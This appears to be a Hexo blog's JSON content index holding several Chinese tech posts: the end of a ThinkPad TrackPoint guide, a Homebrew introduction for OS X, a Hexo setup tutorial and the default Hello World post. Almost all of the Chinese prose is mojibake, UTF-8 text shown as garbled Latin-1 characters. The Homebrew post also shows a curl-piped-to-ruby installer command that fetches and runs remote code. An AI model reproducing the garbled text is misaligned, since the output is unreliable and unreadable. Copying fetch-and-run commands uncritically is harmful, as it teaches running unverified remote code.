&quot;TPPS/2 IBM TrackPoint&quot; &quot;Evdev Wheel Emulation Axes&quot; 6 7 4 5 ä»¥ä¸Šè¿™äº›xinputå‘½ä»¤ä¸æ˜¯æ°¸ä¹…æ€§çš„ï¼Œæ¯æ¬¡å›¾å½¢ç•Œé¢(xserver)é‡å¯ï¼Œéƒ½å¾—é‡æ–°æ‰§è¡Œæ‰èƒ½ç”Ÿæ•ˆã€‚ä½†å¯ä»¥æ”¾åœ¨.xsessionrcå†…ï¼Œå½“xserverå¯åŠ¨æ—¶ä¼šè‡ªåŠ¨æ‰§è¡Œã€‚ å½“ç„¶ï¼Œå¦‚æœä¸å–œæ¬¢å‘½ä»¤è¡Œçš„è¯ï¼Œä¹Ÿæœ‰å›¾å½¢ç•Œé¢ç¨‹åºæ¥è§£å†³å•¦ã€‚æœ‰ä¸¤ä¸ªé€‰æ‹©ï¼ŒGPointing Device Settingså’Œconfigure-trackpointã€‚ç¬”è€…åœ¨Arch Linuxä¸Šå®‰è£…äº†å‰è€…ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º 4. ç»“è¯­ä½“éªŒä¸‹æ¥ï¼ŒMacBookå’ŒThinkPadéƒ½å¾ˆèµï¼Œç°åœ¨è¿™å°290æ”¶æ¥çš„X200å·²ç»æˆä¸ºäº†ç¬”è€…çš„åŠä¸ªä¸»åŠ›æœºï¼Œæ™šä¸Šä¸‹ç­å›å»ï¼Œå¦‚æœä¸å†™åšå®¢çš„è¯ï¼Œå¤§å¤šæ•°æ—¶é—´æ˜¯æŠ±ç€ThinkPadã€‚å¦‚æœè¯»è€…ä¹Ÿæƒ³ä½“éªŒä½“éªŒçš„è¯ï¼Œä¸Šé—²é±¼æ”¶ä¸ªX200æ˜¯ä¸ªå¾ˆä¸é”™çš„é€‰æ‹©ï¼Œå½“ç„¶ï¼ŒX61ä¹Ÿå¯ä»¥è€ƒè™‘å“¦ï¼Œè™½ç„¶æ€§èƒ½æ¯”X200å·®ï¼Œä½†æ˜¯æœ€è¿‘æ°‘é—´æœ‰â€œå‚å­â€æœ‰åœ¨å¼€å‘å·ç§°â€œX62â€çš„ä¸»æ¿ï¼Œå…·ä½“è¯¦è§ ã€‚æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"Toy","slug":"Toy","permalink":"https://blog.chaosjohn.com/tags/Toy/"},{"name":"Hardware","slug":"Hardware","permalink":"https://blog.chaosjohn.com/tags/Hardware/"},{"name":"ThinkPad","slug":"ThinkPad","permalink":"https://blog.chaosjohn.com/tags/ThinkPad/"},{"name":"TrackPoint","slug":"TrackPoint","permalink":"https://blog.chaosjohn.com/tags/TrackPoint/"}]},{"title":"HomeBrew -- OSXä¸‹çš„æœ€å¼ºè½¯ä»¶åŒ…ç®¡ç†å™¨","slug":"HomeBrew-The-Best-Package-Manager-On-OSX","date":"2016-05-26T09:23:57.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"HomeBrew-The-Best-Package-Manager-On-OSX.html","link":"","permalink":"https://blog.chaosjohn.com/HomeBrew-The-Best-Package-Manager-On-OSX.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ 1. ä»€ä¹ˆæ˜¯è½¯ä»¶åŒ…ç®¡ç†å™¨è½¯ä»¶åŒ…ç®¡ç†å™¨ï¼ˆä»¥ä¸‹ç®€ç§°åŒ…ç®¡ç†å™¨ï¼‰ï¼Œæ˜¯ç”¨æ¥ç®¡ç†ç³»ç»Ÿä¸‹é¢è½¯ä»¶å’Œç¨‹åºçš„å·¥å…·ï¼Œè´Ÿè´£å®ƒä»¬çš„æœç´¢ã€å®‰è£…ã€æ›´æ–°å‡çº§å’Œå¸è½½ã€‚ 2. ä¸ºä»€ä¹ˆéœ€è¦åŒ…ç®¡ç†å™¨ åŒ…ç®¡ç†å™¨ä¸€èˆ¬æ¥è¯´æ˜¯*nixç³»ç»Ÿ(Unix-like: Linux, Mac OS X, FreeBSDç­‰ç­‰)ç‹¬æœ‰çš„ã€‚ Windowsçš„è½¯ä»¶ç”Ÿæ€ç³»ç»Ÿå†³å®šäº†å®ƒä¸éœ€è¦åŒ…ç®¡ç†å™¨ï¼Œå¤§éƒ¨åˆ†ç”¨æˆ·éƒ½æ˜¯ç”¨å®ƒçš„å›¾å½¢ç•Œé¢ï¼Œä»–ä»¬æ‰€éœ€è¦åšçš„å°±æ˜¯åœ¨è·å–åˆ°è¯¥è½¯ä»¶çš„å®‰è£…åŒ…(Installer)åï¼Œè¿è¡Œåâ€Nextâ€-&gt;â€Nextâ€-&gt;â€¦-&gt;â€Finishâ€ï¼Œç›´è‡³å®‰è£…åˆ°æŸä¸ªè·¯å¾„ä¸‹ï¼Œåˆ›å»ºè½¯ä»¶çš„å¯åŠ¨å™¨å¿«æ·æ–¹å¼ã€‚ *nixç³»ç»Ÿä¸­é™¤äº†Mac OS X(ä»¥ä¸‹ç®€ç§°OSX)å¤–ï¼Œå…¶ä»–çš„ç³»ç»Ÿçš„ä¸»è¦ç”¨é€”æ˜¯ä½œä¸ºæœåŠ¡å™¨ï¼Œç”¨Linuxåšæ¡Œé¢ç³»ç»Ÿæ¥ç”¨çš„å®¶ä¼™ä¸ä¼šå¾ˆå¤šï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯åƒæˆ‘è¿™æ ·çš„è‹¦é€¼ç¨‹åºçŒ¿ï¼Œç”¨FreeBSDå½“æ¡Œé¢ä½¿ç”¨çš„æ›´æ˜¯å°‘ä¹‹åˆå°‘ã€‚é‚£ä¹ˆä½œä¸ºæœåŠ¡å™¨æ¥ç”¨çš„è¯ï¼Œä¸€èˆ¬éƒ½ä¸é…å¤‡å›¾å½¢ç•Œé¢çš„ï¼Œåªæœ‰å‘½ä»¤è¡Œæ¥å£ã€‚åŸå› æœ‰äºŒï¼šä¸€ã€å›¾å½¢ç•Œé¢è€—æ€§èƒ½å•Šï¼›äºŒã€ä¸€èˆ¬æœåŠ¡å™¨éƒ½æ¶åœ¨äº‘ç«¯ï¼Œä½ å¼€ä¸ªå›¾å½¢ç•Œé¢è¿œç¨‹ç™»å½•ä¸Šå»ï¼Œé¼ æ ‡æ‹–åŠ¨éƒ½ä¸€å¡ä¸€å¡çš„ï¼Œé‚£ç”»é¢ï¼ŒçœŸæ˜¯å¤ªç¾ä¸å¿çœ‹ã€‚æ‰€ä»¥ä¸€èˆ¬çš„Linuxçš„å‘è¡Œç‰ˆå’ŒFreeBSDéƒ½æä¾›äº†åŒ…ç®¡ç†å™¨ï¼Œè®©ç”¨æˆ·èƒ½åœ¨å‘½ä»¤è¡Œä¸‹æ¯”è¾ƒè½»æ¾åœ°ç®¡ç†è½¯ä»¶ï¼ˆDebian: apt-get, Redhat/CentOS/Fedora: yum, ArchLinux: pacmanï¼‰ã€‚ã€‚ã€‚å‘ƒï¼Œé‚£äº›çƒ­è¡·äºä»»ä½•è½¯ä»¶éƒ½è¦ä»æºä»£ç å®‰è£…çš„å®¶ä¼™ï¼Œæœ‰æ¯’ï¼Œæˆ‘æœï¼ ä¸çŸ¥é“æ˜¯è°è¯´è¿‡æ¥ç€ï¼šâ€œMacBookçš„æ­»å¿ ç”¨æˆ·ä¸»è¦æœ‰ä¸¤ç±»ï¼šæè®¾è®¡çš„å’ŒæITçš„â€ã€‚ã€‚ã€‚æ—¢ç„¶æITï¼Œé‚£è‚¯å®šç¦»ä¸å¼€å‘½ä»¤è¡Œã€‚å¯¹äºæˆ‘ä»¬ç¨‹åºçŒ¿æ¥è¯´ï¼ŒOSXçœŸæ˜¯ä¸€ä¸ªç»å¦™çš„ç»„åˆï¼Œæ—¢æœ‰éå¸¸ç¾ä¸½æ˜“ç”¨çš„GUIï¼Œåˆæœ‰çº¯*nixçš„å‘½ä»¤è¡Œã€‚åƒngnixå’Œapacheç­‰ç­‰è¿™äº›å‘½ä»¤è¡Œè½¯ä»¶ï¼ŒOSXâ€œå‡ºå‚â€æ—¶æ˜¯æ²¡æœ‰çš„ï¼Œæ‰€ä»¥è¦ä¹ˆä»ä¸‹è½½å®ƒä»¬çš„æºä»£ç ç¼–è¯‘å®‰è£…ï¼Œè¦ä¹ˆå°±ç”¨åŒ…ç®¡ç†å™¨æ¥å®‰è£…ã€‚ 3. OSXä¸‹æœ‰å“ªäº›åŒ…ç®¡ç†å™¨ __MacPorts__ï¼šæºäºBSDçš„portsï¼Œçº¯æºç ç¼–è¯‘å®‰è£…ã€‚ç”¨ç®€å•çš„è¯æ¥è¯´ï¼Œå®ƒå¸®ä½ è®¡ç®—ç›®æ ‡è½¯ä»¶æ‰€éœ€è¦çš„ä¾èµ–ï¼Œç„¶åæŠŠæ‰€æœ‰ä¾èµ–å’Œç›®æ ‡è½¯ä»¶ä¾æ¬¡ä¸‹è½½æºç ç¼–è¯‘å®‰è£…ã€‚å®ƒçš„ä¼˜ç‚¹å¾ˆæ˜æ˜¾ï¼Œè½¯ä»¶ä¸ä¾èµ–æ“ä½œç³»ç»Ÿæœ¬èº«ï¼Œå‡çº§ç³»ç»Ÿç‰ˆæœ¬ä¸€èˆ¬ä¸ä¼šç ´åè½¯ä»¶ä½“ç³»ï¼›åŒæ—¶ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œæ— è®ºå®‰è£…è¿˜æ˜¯æ›´æ–°è½¯ä»¶ï¼Œç¼–è¯‘æºä»£ç å®åœ¨æ˜¯å¤ªè´¹æ—¶é—´äº†ï¼Œç¬”è€…çš„ç¬¬ä¸€å°Macbookæ˜¯09å¹´çš„ç»å…¸å°ç™½mc207ï¼Œé…·ç¿P7550çš„CPUï¼Œæ¯æ¬¡å‡çº§MacPortséƒ½åªæ•¢åœ¨æ™šä¸Šç¡è§‰æ—¶è¿›è¡Œã€‚MacPortsæ˜¯ç¬”è€…æœ€æ—©ä½¿ç”¨çš„ï¼Œé™ªä¼´äº†å°†è¿‘ä¸‰å¹´æ—¶é—´ã€‚æœ€åæ”¾å¼ƒçš„åŸå› ä¸æ˜¯ç¼–è¯‘è´¹æ—¶ï¼Œè€Œæ˜¯ç³»ç»Ÿå‡çº§åˆ°äº†Yosemiteå’ŒEl Capitanåï¼Œæœ‰å¾ˆå¤šè½¯ä»¶æ­»æ´»ç¼–è¯‘ä¸é€šè¿‡ï¼Œæ— æ³•æ›´æ–°ã€‚ Fink: å¾ˆæŠ±æ­‰ç¬”è€…æ²¡æœ‰ç”¨è¿‡ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œæˆ‘åªæ”¾ç§‘æ™®è´´çš„ç®€ä»‹Finkæ˜¯åŸºäºDebiançš„packaging toolså¼€å‘çš„ã€‚æœ€å¤§çš„ç‰¹ç‚¹æ˜¯å®‰è£…è½¯ä»¶æ˜¯é¢„ç¼–è¯‘å¥½çš„(pre-compiled/pre-built)ã€‚ æ‰€ä»¥ï¼Œç”¨Finkå®‰è£…packageæ˜¯ä¸éœ€è¦åœ¨æœ¬æœºç¼–è¯‘çš„ï¼Œéƒ½æ˜¯ç°æˆçš„binary codeã€‚ Finkæœ€å¤§çš„é—®é¢˜æ˜¯packageè·Ÿè¿›ä¸å¤Ÿå¿«ã€‚å¾ˆå¤šæœ€æ–°ç‰ˆçš„è½¯ä»¶ï¼Œä½ è¦ç­‰Finkã€‚ HomeBrew: å“ˆå“ˆå“ˆï¼Œæœ‰äº›è¯»è€…éƒ½è¦æ€ªæˆ‘å•°å—¦äº†ï¼Œè¿™ä¹ˆåŠå¤©æ‰å¼€å§‹æ–‡ç« çš„ä¸»è¦è§’è‰²ã€‚HomeBrewæ˜¯åŸºäºRubyè¯­è¨€å†™çš„ï¼Œä»åŒ…ç®¡ç†çš„ç‰¹è‰²ä¸Šæ¥çœ‹ï¼Œå®ƒä¼¼ä¹æ˜¯Macportså’ŒFinkä¿©ç”Ÿçš„å„¿å­ ğŸ˜‚ã€‚åœ¨ä¾èµ–å¤„ç†ä¸Šï¼Œå®ƒå°½é‡ä½¿ç”¨ç³»ç»ŸåŸæœ‰çš„åº“ï¼Œå¦‚æœç³»ç»Ÿä¸æä¾›ï¼Œå®ƒæ‰å®‰è£…ä¾èµ–ï¼›å®‰è£…æ—¶ä¼˜å…ˆé€‰æ‹©å·²ç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶åŒ…ï¼Œå¦‚æœæ²¡æœ‰å®ƒæ‰ä¸‹è½½æºç è¿›è¡Œç¼–è¯‘å®‰è£…ã€‚ 4. å®‰è£…HomeBrew ç¬”è€…ä¹‹å‰ä»‹ç»è¿‡ï¼ŒHomeBrewæ˜¯ç”¨Rubyå†™çš„ï¼Œè€ŒOSXå†…ç½®äº†Rubyï¼Œæ‰€ä»¥æ‰“å¼€ç»ˆç«¯(Terminal)ï¼ŒæŠŠ/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;å¤åˆ¶ç²˜è´´è¿›å»ï¼Œå›è½¦æ‰§è¡Œï¼ŒThatâ€™s allã€‚ 5. HomeBrewåŸºç¡€å‘½ä»¤ ç¬”è€…åœ¨è¿™è¾¹ä»¥å®‰è£…wgetä¸¾ä¾‹ï¼ˆOSXå±…ç„¶æ²¡æœ‰é›†æˆwgetï¼ŒçœŸæœ‰ç‚¹ä¸çˆ½ï¼‰ brew search wget æœç´¢è½¯ä»¶ï¼Œåˆ—å‡ºæ‰€æœ‰åŒ…å«ç›®æ ‡åç§°çš„è½¯ä»¶ brew install wget å®‰è£…è½¯ä»¶ï¼Œé»˜è®¤å®‰è£…åˆ°/usr/localä¸‹é¢å» brew info wget æŸ¥çœ‹å®‰è£…åŒ…ä¿¡æ¯ brew uninstall wget å¸è½½è½¯ä»¶ brew update æ›´æ–°æ‰€æœ‰è½¯ä»¶åˆ—è¡¨ï¼ˆHomeBrewä½¿ç”¨gitï¼Œç›´æ¥ä»githubä¸Špullä¸‹æ¥ï¼‰ brew upgrade å‡çº§æ‰€æœ‰è½¯ä»¶ brew cleanup æ¸…ç† brew list åˆ—å‡ºæ‰€æœ‰é€šè¿‡HomeBrewå®‰è£…çš„è½¯ä»¶ brew doctor æ£€æŸ¥HomeBrewæ˜¯å¦å­˜åœ¨é—®é¢˜ 6. ç¬”è€…ç”¨HomeBrewå®‰è£…çš„è½¯ä»¶æ¨èåˆ—è¡¨ wget ä¸å†èµ˜è¿° htop topçš„é«˜çº§ç‰ˆï¼Œæ›´ç›´è§‚ï¼Œæ˜¯ä¸€æ¬¾ç”¨æ¥ç›‘æµ‹ç³»ç»Ÿçš„CPUã€å†…å­˜ã€uptimeã€è¿›ç¨‹ç­‰ç³»ç»Ÿä¿¡æ¯çš„å·¥å…· tree ä»¥æ ‘çŠ¶å½¢å¼åˆ—å‡ºæ–‡ä»¶ç›®å½•æ ‘ tmux ç»ˆç«¯å¤ç”¨è½¯ä»¶ï¼Œç¥å™¨ï¼Œè°ç”¨è°çŸ¥é“ hardlink-osx è®©ä½ ç»™ç›®å½•åŠ ç¡¬é“¾æ¥ï¼Œå¯¹ï¼Œä½ æ²¡å¬é”™ï¼Œç›®å½•ï¼ macvim vimåœ¨OSXä¸‹çš„GUIç‰ˆæœ¬ï¼Œåšäº†å¾ˆå¤šOSXçš„æœ¬åœ°åŒ–ï¼Œæ¯”å¦‚cmd+wå…³é—­ç­‰ç­‰ mpg123 mpg321 åå­—å¾ˆç§€é€—çš„ä¸¤ä¸ªè½¯ä»¶ï¼Œå‘½ä»¤è¡ŒéŸ³ä¹æ’­æ”¾å™¨ï¼Œå¯ä»¥ç”¨æ¥è£…ä¸ªé€¼ğŸ˜€ mplayer mpv ä¸¤ä¸ªéå¸¸æ£’çš„å¤šåª’ä½“æ’­æ”¾å™¨ï¼Œä¸ªäººæ›´åå¥½åè€… mtr tracerouteçš„åŠ å¼ºç‰ˆ nvm å¯¹nodeè¿›è¡Œå¤šç‰ˆæœ¬ç®¡ç† python3 OSXä¸‹å®‰è£…Python3æœ€ä¸ºæ–¹ä¾¿çš„æ–¹æ³•äº† 7. Cask â€“ HomeBrewçš„å¤§æ€å™¨ ä¸€å¥è¯ä»‹ç»ï¼šç”¨æ¥å®‰è£…å„ç§OSXåº”ç”¨ç¨‹åºçš„å·¥å…·ï¼Œä¾‹å¦‚Chrome, Firefoxï¼ŒMysqlWorkbenchã€‚ å®‰è£…Caskï¼šbrew tap phinze/homebrew-cask &amp;&amp; brew install brew-cask ä½¿ç”¨ï¼ˆä»¥Chromeä¸¾ä¾‹ï¼‰ï¼š brew cask search chrome æœç´¢åº”ç”¨ï¼Œç»“æœæ˜¾ç¤ºæˆ‘ä»¬è¦å®‰è£…google-chrome brew cask install google-chrome å®‰è£…åº”ç”¨ brew cask uninstall google-chrome å¸è½½åº”ç”¨ brew update æ›´æ–°æ‰€æœ‰åº”ç”¨åˆ—è¡¨ brew cleanup æ¸…ç† Caskç›¸æ¯”brewç¼ºå°‘äº†upgradeå‘½ä»¤ï¼Œæ‰€ä»¥è¿™è¾¹å¥‰ä¸Šä¸€è¡Œshellè„šæœ¬ï¼Œç”¨æ¥å‡çº§æ‰€æœ‰ç”¨Caskå®‰è£…çš„åº”ç”¨ç¨‹åº for c in $(brew cask list); do ! brew cask info $c | grep -qF &quot;Not installed&quot; || brew cask install $c; done 8. ç»“è¯­HomeBrewä»¥ç»™æˆ‘èŠ‚çœäº†å¾ˆå¤šæ‰¾è½¯ä»¶å’Œå®‰è£…è½¯ä»¶çš„æ—¶é—´ï¼Œå¯¼è‡´æˆ‘å¯¹å®ƒè¶Šæ¥è¶Šå–œæ¬¢ï¼Œä»¥è‡³äºï¼Œæˆ‘ç³»ç»Ÿé‡Œä¸€åˆ‡èƒ½ç”¨HomeBrewæœç´¢åˆ°çš„è½¯ä»¶ï¼Œæˆ‘å…¨ç”¨å®ƒæ¥æå®šäº†ã€‚å…³äºè¿™ç¯‡åšæ–‡ï¼Œæˆ‘è§‰å¾—å¯¹æŸäº›äººæ¥è¯´ï¼Œé‚£å¥ç»™Caskè¿›è¡Œupgradeçš„shellè„šæœ¬ï¼Œæ˜¯æœ€å…·æœ‰ä»·å€¼çš„ã€‚ï¼ˆé‚£å°±~è€ƒè™‘ç»™æˆ‘ç‚¹æåŠ©è¿›è¡Œé¼“åŠ±å§ï¼Œä¸€å…ƒä¸¤å…ƒä¸å«Œå°‘ï¼Œä¸€ç™¾ä¸¤ç™¾ä¸å«Œå¤šï¼‰","categories":[],"tags":[{"name":"OS X & macOS","slug":"OS-X-macOS","permalink":"https://blog.chaosjohn.com/tags/OS-X-macOS/"},{"name":"Software","slug":"Software","permalink":"https://blog.chaosjohn.com/tags/Software/"}]},{"title":"ä¸Šæ‰‹Hexo","slug":"Getting-Started-With-Hexo","date":"2016-01-28T14:18:28.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"Getting-Started-With-Hexo.html","link":"","permalink":"https://blog.chaosjohn.com/Getting-Started-With-Hexo.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ è¿™ç¯‡æ–‡ç« ä¸»è¦è®°è½½ä¸€ä¸‹æˆ‘å¦‚ä½•ä¸Šæ‰‹Hexo(æ­å»ºæœ¬åšå®¢çš„æŠ€æœ¯)ã€‚ å‰æœŸå‡†å¤‡ NodeJS GitHub (å·²é…ç½®å¥½SSHæ¥å…¥ï¼Œè¯¦æƒ…å‚è€ƒGitHubå®˜ç½‘) åŸŸå (å¯é€‰é¡¹ï¼Œä¸‹é¢ä¼šè¯´æ˜ä½•æ—¶å¿…é¡»è¦æ±‚ç»‘å®šåŸŸå) å¼€å§‹å®‰è£…Hexo$ npm install -g hexo åœ¨GitHubä¸Šåˆ›å»ºåšå®¢ä»“åº“æ­¤æ—¶å¾—è€ƒè™‘ä¸¤ç§é€‰æ‹©ï¼š GitHub Pages (æ¯ä¸ªGitHubè´¦å·åªèƒ½åˆ›å»ºä¸€ä¸ªï¼Œå³è¯¥ä»“åº“çš„é»˜è®¤åˆ†æ”¯masterå°±æ˜¯åšå®¢ï¼Œè€Œä¸”ä»“åº“åæ˜¯å›ºå®šä¸ºusername.github.io)ã€‚å¦‚æœåšå®¢æ­å»ºæˆåŠŸï¼Œæµè§ˆå™¨è®¿é—®https://username.github.ioå°±èƒ½æ‰“å¼€åšå®¢ã€‚ gh-pages (å¯ä»¥åˆ›å»ºæ— é™å¤šä¸ªï¼Œæ¯ä¸ªä»“åº“éƒ½èƒ½åˆ›å»ºä¸€ä¸ªé™æ€åšå®¢ï¼Œä½†æ˜¯åšå®¢å¿…é¡»åœ¨gh-pagesåˆ†æ”¯ä¸‹)ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåšä¸»å¿…éœ€ä½¿ç”¨åŸŸåé€šè¿‡CNAMEè§£æä½ çš„åšå®¢ä»“åº“ï¼Œå¦åˆ™æ–‡ç« çš„CSSæ ·å¼è·¯å¾„ä¼šå‡ºé”™ï¼Œå¯¼è‡´æ•´ä¸ªé¡µé¢ä¼šæ˜¯ä¸‹é¢è¿™ç§æ²¡æœ‰æ ·å¼çš„æ ·å­ åœ¨æœ¬åœ°éƒ¨ç½² åœ¨æœ¬åœ°cloneä½ åˆ›å»ºçš„GitHubä»“åº“ é»˜è®¤ä¸ºmasteråˆ†æ”¯ï¼Œå¦‚æœä½ ä½¿ç”¨çš„æ˜¯gh-pagesï¼Œéœ€è¦åˆ‡æ¢åˆ°gh-pagesåˆ†æ”¯ã€‚$ git branch gh-pages &amp;&amp; git checkout gh-pages åˆå§‹åŒ–hexo $ hexo initï¼Œå¹¶ä¸”è°ƒç”¨npmå®‰è£…ç›¸åº”çš„node_modules $ npm install å¼€å¯æœåŠ¡å™¨è¿›è¡Œæœ¬åœ°é¢„è§ˆï¼ˆæ­¤æ—¶hexoé»˜è®¤ç”Ÿæˆäº†ä¸€ç¯‡Hello-Worldåšå®¢ï¼‰$ hexo serverï¼Œæµè§ˆå™¨æ‰“å¼€localhost:4000å°±èƒ½çœ‹åˆ°æ•ˆæœåšå®¢æ•ˆæœã€‚å»ºè®®æ“ä½œåšå®¢æ—¶å…³é—­æœåŠ¡å™¨(ctrl-c)ã€‚ æ–°å¢åšå®¢$ hexo new &quot;new blog name&quot;ï¼Œhexoä¼šç”Ÿæˆä»¥new-blog-name.mdä¸ºåçš„åšå®¢ éƒ¨ç½²åˆ°GitHub ç¼–è¾‘åšå®¢ä»“åº“æ ¹ç›®å½•ä¸‹çš„_config.ymlæ–‡ä»¶ï¼Œåœ¨æœ«å°¾è¿½åŠ å˜æˆä¸º 123456# Deployment## Docs: http://hexo.io/docs/deployment.htmldeploy: type: git repository: git@github.com:username/blog.git branch: master ä¸ºé¿å…ä¸‹ä¸€æ­¥éª¤å‡ºç° ERROR Deployer not found : gitçš„æŠ¥é”™ï¼Œéœ€è¦å®‰è£…gitéƒ¨ç½²æ¨¡å—$ npm install hexo-deployer-git --save ç”Ÿæˆé™æ€æ–‡ç« $ hexo generate éƒ¨ç½²åˆ°GitHub`$ hexo deploy` æµ‹è¯•åšå®¢ å¦‚æœæ­å»ºçš„æ˜¯GitHub Pagesï¼Œåˆ™ç›´æ¥è®¿é—®https://username.github.ioå³å¯ å¦‚æœæ­å»ºçš„æ˜¯gh-pagesï¼Œåˆ™è¿˜éœ€é…ç½®åŸŸåï¼Œæ¯”å¦‚ç¬”è€…çš„åŸŸåä¸ºchaosjohn.comã€‚ åœ¨åŸŸåçš„DNSè§£æå†…æ–°å¢ä¸¤æ¡Aè®°å½•ï¼ŒæŒ‡å‘GitHub Pagesæä¾›çš„IP 192.30.252.153 192.30.252.154 æ¥ç€åœ¨DNSè§£æå†…æ–°å¢ä¸€æ¡CNAMEè®°å½•ï¼Œè®°å½•åæ¯”å¦‚ä½¿ç”¨blogï¼Œè®°å½•å€¼ä¸ºusername.github.ioï¼Œæ·»åŠ å®Œåå¯èƒ½ä¼šåœ¨è®°å½•å€¼è¿½åŠ ä¸€ä¸ªâ€™.â€™ï¼Œä¸ç”¨çº ç»“ï¼Œè¿™ä¸ªå°±æ˜¯CNAMEçš„æ ¼å¼ã€‚ åœ¨åšå®¢ä»“åº“çš„sourceæ–‡ä»¶å¤¹å†…æ–°å»ºä¸€ä¸ªCNAMEæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹å°±æ˜¯blog.chaosjohn.com é‡æ–°ç”Ÿæˆé™æ€æ–‡ç« å¹¶ä¸”éƒ¨ç½²åˆ°GitHubï¼Œå¯ä»¥ä½¿ç”¨å¿«æ·å‘½ä»¤$ hexo d -g å‘½ä»¤é›†åˆ å¸¸ç”¨å‘½ä»¤ hexo new â€œpostNameâ€ #æ–°å»ºæ–‡ç«  hexo new page â€œpageNameâ€ #æ–°å»ºé¡µé¢ hexo generate #ç”Ÿæˆé™æ€é¡µé¢è‡³publicç›®å½• hexo server #å¼€å¯é¢„è§ˆè®¿é—®ç«¯å£ï¼ˆé»˜è®¤ç«¯å£4000ï¼Œâ€™ctrl + câ€™å…³é—­serverï¼‰ hexo deploy #å°†.deployç›®å½•éƒ¨ç½²åˆ°GitHub hexo help # æŸ¥çœ‹å¸®åŠ© hexo version #æŸ¥çœ‹Hexoçš„ç‰ˆæœ¬ å¤åˆå‘½ä»¤ hexo deploy -g #ç”ŸæˆåŠ éƒ¨ç½² hexo server -g #ç”ŸæˆåŠ é¢„è§ˆ å‘½ä»¤ç®€å†™ hexo n == hexo new hexo g == hexo generate hexo s == hexo server hexo d == hexo deploy (å„ä½å¤§ä¾ è¡Œè¡Œå¥½ç»™ç‚¹æåŠ©å§ï¼‰","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://blog.chaosjohn.com/tags/hexo/"}]},{"title":"Hello World","slug":"hello-world","date":"2016-01-28T13:18:28.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"hello-world.html","link":"","permalink":"https://blog.chaosjohn.com/hello-world.html","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[],"tags":[{"name":"jvm","slug":"jvm","permalink":"https://blog.chaosjohn.com/tags/jvm/"},{"name":"java","slug":"java","permalink":"https://blog.chaosjohn.com/tags/java/"},{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://blog.chaosjohn.com/tags/SpringBoot/"},{"name":"kotlin","slug":"kotlin","permalink":"https://blog.chaosjohn.com/tags/kotlin/"},{"name":"life","slug":"life","permalink":"https://blog.chaosjohn.com/tags/life/"},{"name":"OS X & macOS","slug":"OS-X-macOS","permalink":"https://blog.chaosjohn.com/tags/OS-X-macOS/"},{"name":"shell","slug":"shell","permalink":"https://blog.chaosjohn.com/tags/shell/"},{"name":"Linux","slug":"Linux","permalink":"https://blog.chaosjohn.com/tags/Linux/"},{"name":"hostname","slug":"hostname","permalink":"https://blog.chaosjohn.com/tags/hostname/"},{"name":"Python","slug":"Python","permalink":"https://blog.chaosjohn.com/tags/Python/"},{"name":"Flask","slug":"Flask","permalink":"https://blog.chaosjohn.com/tags/Flask/"},{"name":"Django","slug":"Django","permalink":"https://blog.chaosjohn.com/tags/Django/"},{"name":"ORM","slug":"ORM","permalink":"https://blog.chaosjohn.com/tags/ORM/"},{"name":"tmux","slug":"tmux","permalink":"https://blog.chaosjohn.com/tags/tmux/"},{"name":"ddns","slug":"ddns","permalink":"https://blog.chaosjohn.com/tags/ddns/"},{"name":"MySQL","slug":"MySQL","permalink":"https://blog.chaosjohn.com/tags/MySQL/"},{"name":"proxy","slug":"proxy","permalink":"https://blog.chaosjohn.com/tags/proxy/"},{"name":"v2ray","slug":"v2ray","permalink":"https://blog.chaosjohn.com/tags/v2ray/"},{"name":"PAC","slug":"PAC","permalink":"https://blog.chaosjohn.com/tags/PAC/"},{"name":"TCP/IP","slug":"TCP-IP","permalink":"https://blog.chaosjohn.com/tags/TCP-IP/"},{"name":"netcat","slug":"netcat","permalink":"https://blog.chaosjohn.com/tags/netcat/"},{"name":"zsh","slug":"zsh","permalink":"https://blog.chaosjohn.com/tags/zsh/"},{"name":"network","slug":"network","permalink":"https://blog.chaosjohn.com/tags/network/"},{"name":"tool","slug":"tool","permalink":"https://blog.chaosjohn.com/tags/tool/"},{"name":"port-forwarding","slug":"port-forwarding","permalink":"https://blog.chaosjohn.com/tags/port-forwarding/"},{"name":"debug","slug":"debug","permalink":"https://blog.chaosjohn.com/tags/debug/"},{"name":"php","slug":"php","permalink":"https://blog.chaosjohn.com/tags/php/"},{"name":"xdebug","slug":"xdebug","permalink":"https://blog.chaosjohn.com/tags/xdebug/"},{"name":"sed","slug":"sed","permalink":"https://blog.chaosjohn.com/tags/sed/"},{"name":"git","slug":"git","permalink":"https://blog.chaosjohn.com/tags/git/"},{"name":"fix","slug":"fix","permalink":"https://blog.chaosjohn.com/tags/fix/"},{"name":"composer","slug":"composer","permalink":"https://blog.chaosjohn.com/tags/composer/"},{"name":"dev","slug":"dev","permalink":"https://blog.chaosjohn.com/tags/dev/"},{"name":"package 